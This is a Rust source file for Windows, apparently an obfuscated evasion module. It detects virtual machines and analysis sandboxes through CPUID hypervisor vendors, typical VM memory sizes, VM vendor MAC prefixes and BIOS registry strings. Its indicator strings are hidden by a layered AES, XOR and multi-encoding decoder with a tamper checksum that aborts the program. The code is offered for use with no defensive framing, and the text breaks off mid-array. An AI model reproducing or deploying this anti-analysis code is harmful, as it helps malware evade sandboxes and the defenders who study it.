

use raw_cpuid::CpuId;
use std::arch::x86_64::_rdtsc;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::path::Path;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::NetworkManagement::IpHelper::GetAdaptersInfo;
use windows::Win32::NetworkManagement::IpHelper::IP_ADAPTER_INFO;
use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
use windows::Win32::System::Diagnostics::ToolHelp::CreateToolhelp32Snapshot;
use windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32W;
use windows::Win32::System::Diagnostics::ToolHelp::Process32FirstW;
use windows::Win32::System::Diagnostics::ToolHelp::Process32NextW;
use windows::Win32::System::Diagnostics::ToolHelp::TH32CS_SNAPPROCESS;
use windows::Win32::System::Registry::HKEY;
use windows::Win32::System::Registry::HKEY_LOCAL_MACHINE;
use windows::Win32::System::Registry::KEY_READ;
use windows::Win32::System::Registry::RegCloseKey;
use windows::Win32::System::Registry::RegEnumKeyExW;
use windows::Win32::System::Registry::RegOpenKeyExW;
use windows::Win32::System::Registry::RegQueryValueExW;
use windows::Win32::System::SystemInformation::GetPhysicallyInstalledSystemMemory;
use windows::Win32::System::SystemInformation::GetSystemInfo;
use windows::Win32::System::SystemInformation::SYSTEM_INFO;
use windows::core::PCWSTR;
use windows::core::PWSTR;

#[inline(never)]
fn checksum_xhfshvdu_cpne(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_tk_smkebhmyyv(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_xhfshvdu_cpne(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

           pub fn check_cpuid_hypervisor () -> bool { let cpuid = CpuId :: new () ; if let Some (hypervisor_info) = cpuid . get_hypervisor_info () { match hypervisor_info . identify () { raw_cpuid :: Hypervisor :: VMware | raw_cpuid :: Hypervisor :: KVM | raw_cpuid :: Hypervisor :: HyperV | raw_cpuid :: Hypervisor :: Xen | raw_cpuid :: Hypervisor :: QEMU => true , raw_cpuid :: Hypervisor :: Unknown (ebx , ecx , edx) => { let mut vendor_id : [u8 ; (4 + 8)] = [0 ; (4 + 8)] ; vendor_id [0 .. 4] . copy_from_slice (& ebx . to_le_bytes ()) ; vendor_id [4 .. 8] . copy_from_slice (& ecx . to_le_bytes ()) ; vendor_id [8 .. (1 + 11)] . copy_from_slice (& edx . to_le_bytes ()) ; let vendor = std :: str :: from_utf8 (& vendor_id) . unwrap_or ("") ; matches ! (vendor , "VBoxVBoxVBox" | "prl hyperv") } _ => false , } } else { false } } pub fn check_memory_size () -> bool { let mut total_memory_in_kb : u64 = 0 ; if unsafe { GetPhysicallyInstalledSystemMemory (& mut total_memory_in_kb) } . is_ok () { let total_memory_in_gb = total_memory_in_kb / (204 + 820) / (234 + 790) ; let common_vm_sizes = [1 , 2 , 4] ; common_vm_sizes . contains (& total_memory_in_gb) } else { false } } pub fn check_mac_address () -> bool { let mut buffer_size : u32 = 0 ; unsafe { GetAdaptersInfo (None , & mut buffer_size) ; } if buffer_size == 0 { return false ; } let mut adapter_info_buffer : Vec < u8 > = vec ! [0 ; buffer_size as usize] ; let adapter_info_ptr = adapter_info_buffer . as_mut_ptr () as * mut IP_ADAPTER_INFO ; if unsafe { GetAdaptersInfo (Some (adapter_info_ptr) , & mut buffer_size) } == 0 { let vm_mac_prefixes = [decode_tk_smkebhmyyv (& [245 , 161 , 200 , 57 , 41 , 136 , 49 , 253 , 84 , 58 , 21 , 171 , 18 , 46 , 178 , 120 , 106 , 252 , 183 , 216 , 247 , 204 , 65 , 195 , 148 , 253 , 234 , 135 , 135 , 203 , 148 , 231 , 173 , 96 , 91 , 224 , 114 , 178 , 237 , 80 , 175 , 20 , 118 , 193 , 195 , 247 , 151 , 85 , 179 , 52 , 24 , 6 , 21 , 108 , 117 , 48 , 8 , 61 , 12 , 110 , 9 , 235 , 34 , 130 , 11 , 16 , 144 , 218 , 85 , 184 , 195 , 144 , 157 , 63 , 54 , 247 , 176 , 106 , 92 , 162 , 159 , 142 , 39 , 186 , 76 , 216 , 48 , 194 , 7 , 39 , 180 , 30 , 176 , 207 , 123 , 84 , 102 , 58 , 141 , 223 , 49 , 155 , 44 , 229 , 31 , 205 , 63 , 254 , 202 , 147 , 247 , 10 , 241 , 223 , 199 , 83 , 166 , 57 , 68 , 13 , 190 , 163 , 248 , 59 , 22 , 235 , 13 , 137] , & [17 , 45 , 226 , 199 , 202 , 10 , 142 , 55 , 18 , 11 , 141 , 224 , 146 , 81 , 166 , 172 , 98 , 241 , 59 , 36 , 34 , 160 , 4 , 42 , 33 , 24 , 96 , 143 , 112 , 62 , 1 , 82 , 36 , 68 , 43 , 141 , 239 , 169 , 147 , 68 , 186 , 34 , 47 , 188 , 179 , 135 , 19 , 233 , 40 , 238 , 230 , 214 , 41 , 16 , 178 , 252 , 181 , 65 , 67 , 251 , 179 , 68 , 154 , 248 , 155 , 145 , 174 , 15 , 75 , 252 , 165 , 29 , 72 , 249 , 145 , 154 , 1 , 98 , 62 , 0 , 227 , 137 , 43 , 125 , 252 , 88 , 130 , 8] , 8018703942057u64) , decode_tk_smkebhmyyv (& [1 , 157 , 118 , 239 , 32 , 219 , 40 , 182 , 128 , 131 , 79 , 90 , 222 , 240 , 111 , 195 , 222 , 96 , 244 , 225 , 58 , 38 , 245 , 191 , 125 , 138 , 95 , 152 , 2 , 201 , 113 , 96 , 103 , 250 , 76 , 166 , 100 , 56 , 20 , 101 , 67 , 175 , 110 , 233 , 169 , 222 , 70 , 34 , 138 , 196 , 238 , 159 , 24 , 113 , 104 , 16 , 14 , 179 , 146 , 159 , 246 , 97 , 66 , 98 , 138 , 197 , 73 , 147 , 117 , 154 , 100 , 49 , 103 , 127 , 195 , 142 , 235 , 62 , 49 , 138 , 246 , 134 , 57 , 89 , 78 , 106 , 25 , 17 , 196 , 70 , 211 , 137 , 90 , 105 , 173 , 153 , 38 , 74 , 79 , 12 , 47 , 34 , 179 , 228 , 251 , 66 , 125 , 18 , 207 , 27 , 175 , 39 , 177 , 199 , 241 , 17 , 68 , 124 , 73 , 176 , 113 , 60 , 236 , 224 , 106 , 239 , 18 , 194] , & [157 , 27 , 23 , 71 , 179 , 44 , 146 , 109 , 4 , 198 , 117 , 214 , 50 , 107 , 121 , 130 , 100 , 1 , 4 , 12 , 154 , 43 , 24 , 205 , 37 , 190 , 150 , 218 , 64 , 179 , 194 , 101 , 109 , 67 , 238 , 151 , 167 , 40 , 91 , 168 , 127 , 72 , 254 , 208 , 120 , 21 , 170 , 211 , 59 , 108 , 153 , 4 , 12 , 245 , 136 , 145 , 234 , 97 , 150 , 23 , 247 , 93 , 135 , 206 , 64 , 243 , 119 , 96 , 106 , 188 , 89 , 148 , 61 , 103 , 31 , 79 , 112 , 244 , 77 , 213 , 208 , 0 , 214 , 185 , 224 , 229 , 242 , 123] , 8224862372275u64) , decode_tk_smkebhmyyv (& [140 , 134 , 30 , 66 , 4 , 162 , 204 , 214 , 236 , 44 , 59 , 4 , 73 , 32 , 60 , 22 , 238 , 204 , 186 , 100 , 115 , 221 , 238 , 213 , 220 , 85 , 32 , 191 , 41 , 141 , 253 , 97 , 157 , 172 , 134 , 195 , 163 , 129 , 240 , 3 , 233 , 74 , 240 , 28 , 166 , 129 , 183 , 100 , 78 , 173 , 72 , 134 , 38 , 248 , 83 , 154 , 187 , 167 , 245 , 217 , 8 , 74 , 236 , 221 , 217 , 188 , 91 , 23 , 73 , 227 , 119 , 73 , 183 , 216 , 152 , 101 , 205 , 126 , 36 , 188 , 61 , 16 , 107 , 110 , 230 , 234 , 10 , 143 , 219 , 244 , 109 , 165 , 71 , 172 , 123 , 176 , 79 , 113 , 253 , 187 , 110 , 1 , 137 , 151 , 68 , 185 , 207 , 74 , 229 , 19 , 113 , 167 , 130 , 248 , 19 , 70 , 7 , 206 , 139 , 27 , 95 , 167 , 115 , 58 , 207 , 201 , 74 , 92] , & [70 , 82 , 186 , 87 , 66 , 81 , 22 , 199 , 47 , 2 , 65 , 170 , 249 , 236 , 104 , 93 , 81 , 137 , 136 , 67 , 102 , 196 , 225 , 174 , 191 , 191 , 128 , 114 , 124 , 243 , 16 , 117 , 153 , 0 , 55 , 221 , 46 , 9 , 92 , 48 , 90 , 244 , 116 , 100 , 73 , 92 , 148 , 25 , 190 , 142 , 149 , 38 , 178 , 59 , 218 , 81 , 202 , 9 , 39 , 29 , 177 , 229 , 233 , 124 , 86 , 157 , 19 , 101 , 217 , 161 , 242 , 188 , 70 , 43 , 167 , 140 , 206 , 217 , 61 , 131 , 119 , 27 , 231 , 134 , 98 , 202 , 118 , 68] , 8216272437678u64) , decode_tk_smkebhmyyv (& [52 , 203 , 166 , 32 , 60 , 197 , 202 , 82 , 218 , 171 , 163 , 14 , 29 , 18 , 169 , 13 , 25 , 232 , 253 , 177 , 41 , 106 , 17 , 28 , 192 , 74 , 13 , 106 , 54 , 120 , 152 , 34 , 22 , 83 , 19 , 182 , 35 , 207 , 137 , 32 , 50 , 187 , 175 , 225 , 65 , 45 , 93 , 126 , 178 , 182 , 66 , 145 , 107 , 204 , 161 , 121 , 190 , 17 , 62 , 186 , 7 , 199 , 147 , 225 , 220 , 238 , 38 , 42 , 202 , 5 , 144 , 44 , 197 , 105 , 110 , 17 , 53 , 106 , 144 , 227 , 148 , 31 , 140 , 23 , 232 , 64 , 41 , 172 , 93 , 188 , 50 , 225 , 78 , 255 , 71 , 154 , 51 , 238 , 119 , 80 , 255 , 62 , 117 , 80 , 107 , 109 , 68 , 249 , 219 , 58 , 37 , 86 , 238 , 96 , 110 , 191 , 22 , 98 , 93 , 160 , 18 , 192 , 251 , 242 , 98 , 141 , 236 , 209] , & [222 , 207 , 224 , 153 , 51 , 211 , 101 , 189 , 248 , 243 , 228 , 150 , 35 , 154 , 147 , 75 , 207 , 42 , 134 , 221 , 217 , 47 , 171 , 159 , 135 , 52 , 233 , 121 , 138 , 70 , 122 , 59 , 134 , 192 , 223 , 43 , 189 , 106 , 40 , 176 , 233 , 144 , 188 , 255 , 50 , 225 , 137 , 108 , 33 , 30 , 221 , 219 , 106 , 27 , 247 , 9 , 134 , 41 , 70 , 114 , 238 , 173 , 115 , 126 , 19 , 152 , 106 , 84 , 22 , 136 , 130 , 33 , 151 , 161 , 205 , 99 , 163 , 136 , 63 , 198 , 64 , 214 , 190 , 21 , 187 , 151 , 139 , 177] , 8018703942053u64) , decode_tk_smkebhmyyv (& [247 , 194 , 158 , 224 , 156 , 5 , 197 , 82 , 115 , 58 , 199 , 127 , 79 , 79 , 250 , 9 , 140 , 62 , 169 , 214 , 134 , 201 , 138 , 7 , 209 , 160 , 130 , 253 , 78 , 247 , 12 , 229 , 244 , 97 , 240 , 147 , 247 , 238 , 24 , 82 , 152 , 28 , 3 , 220 , 30 , 92 , 123 , 46 , 213 , 99 , 25 , 167 , 93 , 18 , 113 , 105 , 127 , 0 , 174 , 161 , 69 , 78 , 8 , 4 , 207 , 182 , 226 , 12 , 57 , 32 , 92 , 179 , 134 , 89 , 5 , 11 , 50 , 47 , 63 , 199 , 165 , 92 , 230 , 12 , 62 , 37 , 173 , 6 , 89 , 242 , 115 , 223 , 92 , 89 , 6 , 154 , 74 , 88 , 132 , 252 , 205 , 19 , 195 , 239 , 163 , 25 , 21 , 103 , 37 , 104 , 241 , 112 , 140 , 188 , 147 , 216 , 34 , 206 , 188 , 136 , 76 , 169 , 176 , 150 , 120 , 221 , 64 , 135] , & [110 , 249 , 248 , 19 , 83 , 27 , 222 , 175 , 80 , 15 , 37 , 54 , 225 , 247 , 63 , 208 , 129 , 208 , 0 , 121 , 128 , 159 , 95 , 91 , 106 , 244 , 90 , 211 , 238 , 58 , 235 , 3 , 197 , 211 , 85 , 213 , 234 , 133 , 107 , 61 , 44 , 239 , 154 , 141 , 54 , 119 , 28 , 151 , 249 , 141 , 221 , 75 , 89 , 83 , 98 , 194 , 106 , 138 , 151 , 46 , 11 , 117 , 181 , 133 , 217 , 218 , 31 , 242 , 214 , 96 , 232 , 114 , 203 , 55 , 149 , 221 , 107 , 0 , 179 , 73 , 47 , 89 , 93 , 14 , 74 , 125 , 186 , 44] , 8130373091750u64) , decode_tk_smkebhmyyv (& [238 , 200 , 156 , 179 , 233 , 66 , 200 , 11 , 88 , 247 , 149 , 137 , 125 , 251 , 204 , 81 , 231 , 86 , 46 , 61 , 63 , 64 , 67 , 175 , 20 , 47 , 244 , 107 , 245 , 23 , 18 , 20 , 130 , 62 , 187 , 167 , 224 , 75 , 114 , 188 , 190 , 33 , 26 , 138 , 195 , 193 , 242 , 205 , 50 , 254 , 159 , 31 , 41 , 40 , 33 , 178 , 10 , 96 , 82 , 212 , 196 , 16 , 125 , 227 , 145 , 226 , 241 , 173 , 223 , 31 , 61 , 174 , 12 , 86 , 27 , 174 , 71 , 20 , 163 , 80 , 169 , 240 , 158 , 56 , 175 , 135 , 54 , 244 , 142 , 140 , 33 , 157 , 202 , 241 , 70 , 195 , 248 , 22 , 108 , 208 , 109 , 7 , 113 , 224 , 200 , 158 , 224 , 193 , 112 , 19 , 31 , 124 , 218 , 106 , 162 , 211 , 248 , 3 , 230 , 5 , 58 , 84 , 66 , 5 , 211 , 103 , 255 , 174] , & [190 , 69 , 26 , 135 , 115 , 185 , 102 , 237 , 222 , 78 , 10 , 221 , 11 , 30 , 166 , 239 , 175 , 143 , 206 , 237 , 173 , 148 , 189 , 131 , 207 , 195 , 154 , 150 , 89 , 217 , 93 , 166 , 226 , 65 , 134 , 123 , 92 , 171 , 152 , 167 , 122 , 254 , 53 , 37 , 232 , 37 , 120 , 235 , 160 , 104 , 64 , 196 , 3 , 233 , 197 , 11 , 148 , 115 , 234 , 106 , 110 , 175 , 226 , 127 , 170 , 11 , 120 , 243 , 226 , 146 , 100 , 118 , 196 , 114 , 252 , 12 , 76 , 201 , 63 , 54 , 190 , 4 , 83 , 95 , 231 , 58 , 211 , 124] , 8233452306863u64) , decode_tk_smkebhmyyv (& [131 , 45 , 168 , 46 , 243 , 174 , 206 , 6 , 172 , 82 , 142 , 187 , 5 , 132 , 148 , 99 , 109 , 166 , 120 , 127 , 236 , 254 , 209 , 193 , 31 , 236 , 218 , 5 , 219 , 225 , 2 , 111 , 81 , 70 , 60 , 227 , 150 , 151 , 27 , 68 , 86 , 130 , 56 , 123 , 56 , 21 , 111 , 208 , 53 , 96 , 79 , 175 , 18 , 138 , 152 , 67 , 128 , 233 , 157 , 190 , 103 , 85 , 244 , 53 , 61 , 116 , 179 , 20 , 114 , 1 , 139 , 45 , 213 , 26 , 180 , 31 , 245 , 16 , 86 , 5 , 86 , 173 , 131 , 252 , 35 , 145 , 60 , 8 , 191 , 68 , 59 , 47 , 41 , 9 , 149 , 124 , 51 , 34 , 234 , 114 , 2 , 90 , 180 , 249 , 84 , 133 , 17 , 27 , 226 , 48 , 146 , 99 , 227 , 220 , 61 , 122 , 111 , 234 , 69 , 183 , 63 , 54 , 30 , 145 , 216 , 181 , 98 , 187] , & [33 , 180 , 19 , 205 , 98 , 178 , 112 , 243 , 190 , 84 , 154 , 34 , 2 , 149 , 188 , 135 , 180 , 165 , 218 , 45 , 89 , 3 , 16 , 198 , 191 , 221 , 0 , 156 , 233 , 136 , 186 , 119 , 81 , 16 , 14 , 181 , 143 , 219 , 202 , 227 , 178 , 36 , 149 , 27 , 221 , 108 , 254 , 199 , 113 , 207 , 247 , 197 , 134 , 3 , 134 , 27 , 193 , 34 , 56 , 186 , 224 , 142 , 116 , 122 , 98 , 122 , 232 , 53 , 206 , 16 , 158 , 113 , 50 , 98 , 237 , 195 , 7 , 60 , 191 , 154 , 236 , 230 , 107 , 142 , 198 , 209 , 249 , 159] , 8250632176037u64) ,] ; let mut current_adapter = adapter_info_ptr ; while ! current_adapter . is_null () { let mac_address_len = unsafe { (* current_adapter) . AddressLength } as usize ; if mac_address_len == 6 { let mac_address_slice = unsafe { & (& (* current_adapter) . Address) [0 .. mac_address_len] } ; let mac_address_str = mac_address_slice . iter () . map (| & byte | format ! ("{:02X}" , byte)) . collect :: < Vec < String > > () . join (":") ; for prefix in & vm_mac_prefixes { if mac_address_str . starts_with (& * * prefix) { return true ; } } } current_adapter = unsafe { (* current_adapter) . Next } ; } } false } pub fn check_bios () -> bool { let mut key_handle : HKEY = HKEY (0) ; let subkey_pcwstr = b_acilzxq (& decode_tk_smkebhmyyv (& [79 , 147 , 7 , 141 , 33 , 102 , 25 , 249 , 22 , 220 , 170 , 35 , 48 , 110 , 176 , 155 , 82 , 197 , 144 , 36 , 36 , 94 , 168 , 119 , 254 , 18 , 133 , 242 , 37 , 157 , 219 , 114 , 203 , 21 , 25 , 20 , 186 , 150 , 253 , 239 , 69 , 135 , 78 , 53 , 71 , 0 , 121 , 141 , 89 , 205 , 133 , 171 , 199 , 241 , 187 , 43 , 51 , 143 , 2 , 100 , 59 , 27 , 101 , 241 , 166 , 175 , 38 , 80 , 204 , 199 , 221 , 218 , 63 , 127 , 236 , 25 , 134 , 170 , 116 , 207 , 203 , 231 , 177 , 123 , 159 , 25 , 247 , 137 , 134 , 147 , 95 , 233 , 220 , 130 , 121 , 173 , 100 , 162 , 18 , 90 , 171 , 222 , 12 , 89 , 28 , 207 , 200 , 171 , 240 , 231 , 40 , 44 , 234 , 202 , 81 , 187 , 196 , 125 , 143 , 71 , 124 , 219 , 148 , 143 , 97 , 96 , 109 , 5 , 241 , 235 , 117 , 11 , 146 , 23 , 54 , 74 , 177 , 52 , 39 , 47 , 101 , 191 , 103 , 122 , 129 , 182 , 198 , 51 , 45 , 89 , 70 , 99 , 214 , 99 , 166 , 89 , 33 , 229 , 96 , 61 , 78 , 4 , 138 , 149 , 139 , 245 , 178 , 193 , 31 , 132 , 44 , 186 , 102 , 242 , 65 , 232 , 46 , 43 , 69 , 107 , 95 , 37 , 86 , 222 , 54 , 197 , 106 , 231 , 163 , 85 , 116 , 112 , 67 , 56 , 250 , 249 , 240 , 237 , 150 , 137 , 91 , 44 , 12 , 142 , 188 , 254 , 220 , 153 , 131 , 237 , 190 , 117 , 185 , 146 , 213 , 148 , 47 , 126 , 248 , 43 , 120 , 218 , 202 , 19 , 48 , 137 , 154 , 183 , 177 , 199 , 105 , 54 , 16 , 155 , 230 , 109 , 157 , 124 , 200 , 212 , 131 , 40 , 228 , 243 , 35 , 4 , 217 , 102 , 19 , 201 , 203 , 132 , 239 , 2 , 32 , 157 , 175 , 106 , 50 , 32 , 20 , 41 , 194 , 26 , 117 , 49 , 52 , 148 , 157 , 254 , 172 , 180 , 75 , 194 , 216 , 60 , 20 , 64 , 132 , 196 , 52 , 172 , 48 , 103 , 74 , 168 , 22 , 213 , 153 , 214 , 248 , 224 , 230 , 13 , 139 , 246 , 162 , 153 , 165 , 46 , 131 , 224 , 107 , 195 , 24 , 40 , 190 , 32 , 233 , 12 , 178 , 252 , 50 , 245 , 65 , 77 , 219 , 165 , 178 , 111 , 11 , 228 , 8 , 67 , 225 , 90 , 225 , 152 , 126 , 67 , 141 , 122 , 126 , 63 , 150 , 217] , & [181 , 62 , 93 , 172 , 84 , 149 , 247 , 215 , 150 , 37 , 89 , 16 , 75 , 48 , 241 , 31 , 86 , 94 , 121 , 115 , 142 , 108 , 11 , 14 , 140 , 96 , 95 , 38 , 91 , 52 , 129 , 228 , 19 , 9 , 73 , 94 , 223 , 152 , 224 , 39 , 43 , 2 , 69 , 196 , 112 , 32 , 64 , 44 , 76 , 31 , 195 , 131 , 179 , 78 , 221 , 235 , 155 , 200 , 79 , 72 , 254 , 31 , 5 , 197 , 182 , 29 , 186 , 109 , 29 , 153 , 158 , 7 , 184 , 140 , 121 , 142 , 117 , 45 , 126 , 154 , 87 , 22 , 156 , 84 , 66 , 34 , 209 , 10] , 125696512886992u64)) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (subkey_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut key_handle ,) } . is_err () { return false ; } let vm_bios_strings = [decode_tk_smkebhmyyv (& [22 , 112 , 73 , 105 , 140 , 108 , 64 , 248 , 253 , 11 , 140 , 214 , 120 , 126 , 129 , 130 , 54 , 31 , 98 , 236 , 118 , 96 , 108 , 226 , 16 , 208 , 54 , 127 , 15 , 223 , 118 , 165 , 97 , 32 , 38 , 129 , 225 , 122 , 119 , 140 , 104 , 126 , 141 , 155 , 227 , 0 , 60 , 152 , 210 , 180 , 250 , 94 , 139 , 63 , 190 , 141 , 179 , 235 , 219 , 124 , 229 , 103 , 40 , 215 , 114 , 216 , 122 , 53 , 161 , 43 , 134 , 33 , 51 , 133 , 110 , 217 , 141 , 133 , 9 , 204 , 92 , 132 , 237 , 67 , 212 , 246 , 53 , 0 , 101 , 147 , 241 , 52 , 17 , 60 , 147 , 148] , & [19 , 120 , 156 , 212 , 91 , 89 , 213 , 191 , 62 , 244 , 233 , 155 , 154 , 217 , 188 , 221 , 182 , 192 , 41 , 28 , 174 , 115 , 173 , 32 , 71 , 91 , 226 , 246 , 40 , 159 , 100 , 227 , 6 , 184 , 32 , 108 , 230 , 154 , 230 , 206 , 245 , 57 , 107 , 224 , 44 , 99 , 212 , 69 , 63 , 1 , 66 , 182 , 221 , 101 , 171 , 95 , 121 , 245 , 166 , 132 , 225 , 186 , 68 , 111 , 149 , 126 , 14 , 111 , 104 , 150 , 23 , 91 , 47 , 100 , 196 , 196 , 102 , 182 , 11 , 29 , 226 , 16 , 51 , 70 , 148 , 219 , 96 , 172] , 8602819494483u64) , decode_tk_smkebhmyyv (& [25 , 71 , 165 , 40 , 218 , 115 , 5 , 117 , 71 , 34 , 57 , 108 , 93 , 15 , 219 , 56 , 22 , 150 , 4 , 165 , 1 , 192 , 232 , 206 , 207 , 90 , 172 , 206 , 138 , 242 , 136 , 72 , 71 , 53 , 43 , 89 , 20 , 132 , 227 , 77 , 165 , 181 , 214 , 39 , 34 , 203 , 61 , 142 , 1 , 226 , 81 , 212 , 146 , 205 , 185 , 71 , 16 , 183 , 90 , 105 , 14 , 103 , 224 , 97 , 117 , 216 , 177 , 81 , 176 , 109 , 178 , 56 , 9 , 5 , 37 , 86 , 13 , 143 , 51 , 69 , 169 , 129 , 162 , 85 , 7 , 169 , 125 , 21 , 42 , 103 , 96 , 34 , 25 , 149 , 197 , 226 , 165 , 218 , 103 , 204 , 214 , 254 , 134 , 84 , 57 , 2 , 133 , 69 , 25 , 60 , 41 , 212 , 130 , 47 , 100 , 56 , 255 , 25 , 71 , 12 , 36 , 72 , 85 , 48 , 66 , 151 , 228 , 156 , 214 , 70 , 145 , 18 , 189 , 128 , 10 , 157 , 2 , 80 , 41 , 93 , 151 , 169 , 240 , 46] , & [172 , 221 , 82 , 115 , 220 , 187 , 108 , 191 , 188 , 249 , 232 , 227 , 25 , 184 , 12 , 27 , 145 , 177 , 229 , 126 , 183 , 106 , 169 , 90 , 73 , 37 , 22 , 191 , 52 , 55 , 59 , 29 , 251 , 199 , 120 , 144 , 162 , 118 , 206 , 74 , 111 , 248 , 2 , 125 , 123 , 218 , 185 , 164 , 178 , 35 , 0 , 184 , 144 , 61 , 127 , 228 , 54 , 52 , 119 , 182 , 121 , 83 , 200 , 181 , 252 , 67 , 241 , 187 , 152 , 224 , 191 , 113 , 102 , 143 , 30 , 172 , 92 , 143 , 72 , 242 , 91 , 134 , 159 , 196 , 142 , 201 , 26 , 209] , 24472723653649u64) , decode_tk_smkebhmyyv (& [27 , 58 , 34 , 126 , 182 , 193 , 129 , 47 , 254 , 252 , 72 , 99 , 34 , 246 , 75 , 253 , 17 , 174 , 112 , 17 , 213 , 184 , 74 , 28 , 84 , 159 , 206 , 113 , 154 , 89 , 137 , 96 , 179 , 210 , 147 , 5 , 51 , 143 , 208 , 40 , 192 , 218 , 161 , 198 , 65 , 51 , 74 , 19 , 149 , 195 , 216 , 187 , 131 , 228 , 3 , 161 , 40 , 226 , 113 , 223 , 182 , 182 , 246 , 127 , 180 , 79 , 46 , 195 , 198 , 123 , 28 , 220 , 49 , 151 , 216 , 112 , 8 , 54 , 178 , 209] , & [45 , 46 , 32 , 167 , 90 , 179 , 167 , 193 , 103 , 56 , 143 , 46 , 84 , 233 , 39 , 203 , 67 , 142 , 96 , 97 , 62 , 123 , 89 , 61 , 152 , 91 , 31 , 100 , 35 , 2 , 96 , 80 , 191 , 115 , 136 , 228 , 82 , 12 , 97 , 242 , 112 , 81 , 184 , 205 , 185 , 230 , 26 , 183 , 63 , 126 , 239 , 55 , 142 , 14 , 100 , 230 , 130 , 131 , 83 , 72 , 83 , 203 , 117 , 251 , 122 , 80 , 86 , 140 , 235 , 178 , 201 , 150 , 247 , 53 , 10 , 115 , 0 , 231 , 192 , 218 , 192 , 177 , 169 , 91 , 165 , 101 , 243 , 248] , 3324304687417u64) , decode_tk_smkebhmyyv (& [86 , 132 , 164 , 230 , 184 , 154 , 85 , 252 , 33 , 228 , 165 , 155 , 178 , 98 , 216 , 203 , 174 , 105 , 53 , 143 , 222 , 103 , 115 , 167 , 67 , 132 , 22 , 1 , 215 , 21 , 8 , 78 , 52 , 72 , 190 , 91 , 175 , 184 , 207 , 71 , 64 , 199 , 211 , 214 , 213 , 58 , 200 , 100 , 202 , 242 , 150 , 161 , 22 , 33 , 215 , 212 , 232 , 153 , 239 , 101 , 89 , 54 , 246 , 150 , 51 , 236 , 104 , 122 , 21 , 92 , 179 , 204 , 116 , 203 , 61 , 243 , 181 , 228 , 48 , 2 , 196 , 36 , 7 , 14 , 128 , 125 , 236 , 133 , 67 , 182 , 65 , 88 , 157 , 77 , 128 , 150] , & [140 , 26 , 27 , 143 , 127 , 58 , 23 , 190 , 182 , 235 , 37 , 167 , 3 , 138 , 13 , 131 , 251 , 130 , 68 , 23 , 240 , 20 , 50 , 161 , 162 , 44 , 69 , 215 , 113 , 138 , 181 , 28 , 181 , 207 , 174 , 93 , 88 , 54 , 10 , 155 , 126 , 212 , 24 , 120 , 86 , 34 , 182 , 88 , 61 , 34 , 77 , 183 , 66 , 217 , 118 , 209 , 230 , 9 , 187 , 90 , 162 , 242 , 174 , 13 , 18 , 199 , 255 , 154 , 245 , 81 , 3 , 58 , 80 , 156 , 133 , 17 , 131 , 204 , 140 , 143 , 108 , 62 , 29 , 97 , 179 , 154 , 224 , 78] , 11678016078476u64) , decode_tk_smkebhmyyv (& [101 , 194 , 61 , 204 , 242 , 163 , 64 , 237 , 2 , 173 